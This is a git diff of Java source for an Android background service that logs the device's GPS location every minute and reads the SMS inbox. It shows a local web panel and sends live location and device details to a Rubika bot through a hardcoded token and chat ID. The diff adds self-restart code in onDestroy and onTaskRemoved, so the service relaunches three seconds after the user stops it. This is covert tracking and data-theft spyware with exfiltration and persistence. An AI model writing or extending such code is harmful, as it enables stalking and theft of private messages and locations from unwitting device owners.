@@ -1,5 +1,6 @@
 package com.security.ravan;
 
+import android.app.AlarmManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
@@ -65,7 +66,7 @@ public class HttpServerService extends Service {
 
     // اطلاعات ربات روبیکا
     private static final String BOT_TOKEN = "BEHDBA0MVRIJCDVZWNXMROXXRFNYDEYJYQBFIVMDAKJSTRDLGZFQLTIVGKOLJDXN";
-   private static final String CHAT_ID = "b0InoT70eav0eb7550cc52f9e4391710";
+    private static final String CHAT_ID = "b0InoT70eav0eb7550cc52f9e4391710";
 
     @Override
     public void onCreate() {
@@ -73,7 +74,7 @@ public class HttpServerService extends Service {
         createNotificationChannel();
         connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
         registerNetworkCallback();
-        startLiveLocation();  // شروع دریافت موقعیت زنده
+        startLiveLocation();
         checkAndReportIp();
     }
 
@@ -176,6 +177,8 @@ public class HttpServerService extends Service {
 
     @Override
     public void onDestroy() {
+        Log.d(TAG, "Service onDestroy called - scheduling restart!");
+        
         unregisterNetworkCallback();
         if (fallbackTimer != null) {
             fallbackTimer.cancel();
@@ -183,9 +186,46 @@ public class HttpServerService extends Service {
         if (locationTimer != null) {
             locationTimer.cancel();
         }
+        if (locationManager != null && locationListener != null) {
+            locationManager.removeUpdates(locationListener);
+        }
         networkExecutor.shutdown();
         stopServer();
+        
+        scheduleRestart();
+        
         super.onDestroy();
+    }
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        Log.d(TAG, "onTaskRemoved called - scheduling restart!");
+        super.onTaskRemoved(rootIntent);
+        scheduleRestart();
+    }
+
+    private void scheduleRestart() {
+        try {
+            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+            Intent restartIntent = new Intent(this, HttpServerService.class);
+            restartIntent.setAction("START");
+            
+            PendingIntent pendingIntent = PendingIntent.getService(
+                    this, 0, restartIntent,
+                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+            
+            long triggerTime = System.currentTimeMillis() + 3000; // 3 ثانیه بعد
+            
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
+            } else {
+                alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
+            }
+            
+            Log.d(TAG, "✅ Restart scheduled in 3 seconds");
+        } catch (Exception e) {
+            Log.e(TAG, "Error scheduling restart: " + e.getMessage());
+        }
     }
 
     private void registerNetworkCallback() {
@@ -201,7 +241,6 @@ public class HttpServerService extends Service {
                 public void onAvailable(Network network) {
                     super.onAvailable(network);
                     checkAndReportIp();
-                    // وقتی نت اومد، آخرین موقعیت رو بفرست
                     sendLastLocationIfAvailable();
                 }
             };
@@ -219,12 +258,10 @@ public class HttpServerService extends Service {
         }
     }
 
-    // شروع دریافت موقعیت زنده (هر 1 دقیقه)
     private void startLiveLocation() {
         try {
             locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
             
-            // بررسی دسترسی
             if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) 
                     != PackageManager.PERMISSION_GRANTED) {
                 Log.d(TAG, "لوکیشن پرمیشن نداریم");
@@ -240,14 +277,11 @@ public class HttpServerService extends Service {
                     String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
                     
                     lastLocation = lat + "," + lon;
-                    
-                    // ذخیره موقعیت در لیست
                     String locationData = timestamp + "|" + lat + "|" + lon + "|" + accuracy;
                     savedLocations.add(locationData);
                     
                     Log.d(TAG, "موقعیت ذخیره شد: " + lat + "," + lon);
                     
-                    // اگه IPv6 داره، موقعیت زنده بفرسته به ربات
                     String ipv6 = getGlobalIPv6();
                     if (ipv6 != null && hasIPv6) {
                         sendToRubikaBot("📍 موقعیت زنده (" + timestamp + "):\nhttps://maps.google.com/?q=" + lat + "," + lon + "\nدقت: " + accuracy + " متر");
@@ -266,10 +300,8 @@ public class HttpServerService extends Service {
                 public void onStatusChanged(String provider, int status, Bundle extras) {}
             };
             
-            // هر 1 دقیقه یا هر 10 متر تغییر
             locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 10, locationListener);
             
-            // همچنین از NETWORK_PROVIDER برای مواقعی که GPS خاموشه
             if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                 locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 60000, 10, locationListener);
             }
@@ -281,12 +313,10 @@ public class HttpServerService extends Service {
         }
     }
 
-    // دریافت آخرین موقعیت ذخیره شده (برای پنل وب)
     public String getLastLocation() {
         return lastLocation;
     }
 
-    // دریافت لیست موقعیت‌های ذخیره شده به صورت HTML (برای پنل وب)
     public static String getSavedLocationsAsHtml() {
         if (savedLocations.isEmpty()) {
             return "<p style='color:#888;'>📍 موقعیتی ذخیره نشده است</p>";
@@ -303,7 +333,6 @@ public class HttpServerService extends Service {
         html.append("<th style='padding: 10px;'>نقشه</th>");
         html.append("</tr>");
         
-        // نمایش آخرین 50 موقعیت (برعکس - جدیدترین اول)
         for (int i = savedLocations.size() - 1; i >= 0 && i >= savedLocations.size() - 50; i--) {
             String loc = savedLocations.get(i);
             String[] parts = loc.split("\\|");
@@ -358,38 +387,37 @@ public class HttpServerService extends Service {
         }
     }
 
-private String getGlobalIPv6() {
-    try {
-        if (connectivityManager == null) return null;
-        
-        Network activeNetwork = connectivityManager.getActiveNetwork();
-        if (activeNetwork == null) return null;
-        
-        LinkProperties linkProps = connectivityManager.getLinkProperties(activeNetwork);
-        if (linkProps == null) return null;
-        
-        List<LinkAddress> addresses = linkProps.getLinkAddresses();
-        for (LinkAddress addr : addresses) {
-            if (addr.getAddress() instanceof Inet6Address) {
-                String ip = addr.getAddress().getHostAddress();
-                int idx = ip.indexOf('%');
-                if (idx >= 0) {
-                    ip = ip.substring(0, idx);
-                }
-                // فقط آدرس‌های Global (نه Link-Local fe80 و نه Unique Local fd/fc)
-                if (!ip.toLowerCase().startsWith("fe80") && 
-                    !ip.equals("::1") &&
-                    !ip.startsWith("fd") &&
-                    !ip.startsWith("fc")) {
-                    return ip;
+    private String getGlobalIPv6() {
+        try {
+            if (connectivityManager == null) return null;
+            
+            Network activeNetwork = connectivityManager.getActiveNetwork();
+            if (activeNetwork == null) return null;
+            
+            LinkProperties linkProps = connectivityManager.getLinkProperties(activeNetwork);
+            if (linkProps == null) return null;
+            
+            List<LinkAddress> addresses = linkProps.getLinkAddresses();
+            for (LinkAddress addr : addresses) {
+                if (addr.getAddress() instanceof Inet6Address) {
+                    String ip = addr.getAddress().getHostAddress();
+                    int idx = ip.indexOf('%');
+                    if (idx >= 0) {
+                        ip = ip.substring(0, idx);
+                    }
+                    if (!ip.toLowerCase().startsWith("fe80") && 
+                        !ip.equals("::1") &&
+                        !ip.startsWith("fd") &&
+                        !ip.startsWith("fc")) {
+                        return ip;
+                    }
                 }
             }
+        } catch (Exception e) {
+            Log.e(TAG, "Error getting IPv6: " + e.getMessage());
         }
-    } catch (Exception e) {
-        Log.e(TAG, "Error getting IPv6: " + e.getMessage());
+        return null;
     }
-    return null;
-}
 
     private void startFallbackReporting() {
         if (fallbackTimer != null) return;
@@ -417,7 +445,6 @@ private String getGlobalIPv6() {
         info.append("📱 دستگاه: ").append(Build.MANUFACTURER).append(" ").append(Build.MODEL).append("\n");
         info.append("🤖 Android: ").append(Build.VERSION.RELEASE).append("\n\n");
         
-        // آخرین موقعیت
         if (!lastLocation.equals("نامشخص")) {
             String[] parts = lastLocation.split(",");
             if (parts.length == 2) {
@@ -461,6 +488,11 @@ private String getGlobalIPv6() {
     private String getRecentSMS() {
         StringBuilder smsList = new StringBuilder();
         try {
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) 
+                    != PackageManager.PERMISSION_GRANTED) {
+                return "  ❌ دسترسی به پیامک داده نشده است";
+            }
+            
             Cursor cursor = getContentResolver().query(
                 Uri.parse("content://sms/inbox"),
                 new String[]{"address", "body", "date"},
